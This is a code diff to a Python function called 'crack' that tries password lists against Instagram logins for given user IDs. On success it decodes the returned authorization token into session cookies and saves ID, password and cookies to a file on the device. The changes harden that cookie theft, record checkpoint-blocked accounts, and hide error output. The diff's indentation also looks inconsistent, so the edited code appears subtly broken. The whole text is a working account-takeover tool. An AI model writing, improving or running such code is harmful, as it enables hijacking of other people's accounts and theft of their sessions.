@@ -226,42 +226,60 @@ def crack(uid, password_list, total_count):
             )
             # Check response
             if 'logged_in_user' in response.text:
-                print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
-                try:
-                    # Clean up the response text by removing escaped backslashes
-                    clean_response = str(response.text).replace('\\', '')
-                    # Extract IG-Set-Authorization header
-                    ig_set_auth_match = re.search(r'"IG-Set-Authorization": "(.*?)"', clean_response)
-                    if ig_set_auth_match:
-                        self.ig_set_autorization = ig_set_auth_match.group(1)
-                        # Decode the base64 part after "Bearer IGT:2:"
-                        if "Bearer IGT:2:" in self.ig_set_autorization:
-                            base64_part = self.ig_set_autorization.split('Bearer IGT:2:')[1]
-                            # Add padding if necessary for base64 decoding
-                            padding = 4 - len(base64_part) % 4
-                            if padding != 4:
-                                base64_part += "=" * padding
-                            # Decode base64
-                            decoded_bytes = base64.urlsafe_b64decode(base64_part)
-                            self.decode_ig_set_authorization = json.loads(decoded_bytes.decode('utf-8'))                 
-                            # Create cookie string from decoded data
-                            cookies = ';'.join([f'{name}={value}' for name, value in self.decode_ig_set_authorization.items()])
-                            print(f"\n=== Cookie ===")
-                            print(cookies)
-                            open("/sdcard/SUMON_INS_IDS.txt","a").write(uid+"|"+pw+"|"+cookies+"\n")
-                            return True
+            print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
+            try:
+                # Extract IG-Set-Authorization header more robustly
+                auth_header = response.headers.get('IG-Set-Authorization')
+                if not auth_header:
+                    # Try to find it in response text if not in headers
+                    clean_response = response.text.replace('\\', '')
+                    ig_set_auth_match = re.search(r'IG-Set-Authorization["\']?\s*:\s*["\'](.*?)["\']', clean_response)
+                    auth_header = ig_set_auth_match.group(1) if ig_set_auth_match else None
+        
+                if auth_header and "Bearer IGT:2:" in auth_header:
+                    base64_part = auth_header.split('Bearer IGT:2:')[1]
+            
+                    # Add padding for base64 decoding
+                    padding_needed = len(base64_part) % 4
+                    if padding_needed:
+                        base64_part += '=' * (4 - padding_needed)
+            
+                    try:
+                        # Decode base64
+                        decoded_bytes = base64.urlsafe_b64decode(base64_part)
+                        decoded_data = json.loads(decoded_bytes.decode('utf-8'))
+                
+                        # Create cookie string
+                        cookies = []
+                        for name, value in decoded_data.items():
+                            if value:  # Skip empty values
+                                cookies.append(f'{name}={value}')
+                
+                        if cookies:
+                            cookie_string = '; '.join(cookies)
+                            print(f"\n\033[1;96m=== Cookie ===\033[0m")
+                            print(f"\033[1;97m{cookie_string}\033[0m")
+                    
+                            # Save to file with proper formatting
+                            with open("/sdcard/SUMON_INS_IDS.txt", "a") as f:
+                                f.write(f"{uid}|{pw}|{cookie_string}\n")
+                    
+                    return True
+                    
             elif 'challenge_required' in response.text:
                 print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
                 continue
             elif 'checkpoint_required' in response.text:
                 print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
+                open("/sdcard/SUMON_INS_CP.txt","a").write(uid+"|"+pw+"\n")
+                cps.append(uid)
                 continue
             else:
                 #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
                 
     except requests.exceptions.Timeout:
-        print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
+        #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
         return False
     except requests.exceptions.ConnectionError:
         time.sleep(5)
@@ -273,7 +291,7 @@ def crack(uid, password_list, total_count):
         print(f"\r\033[1;93m [Interrupted] User stopped the process")
         raise
     except Exception as e:
-        print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
+        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
         return False
     
     return False
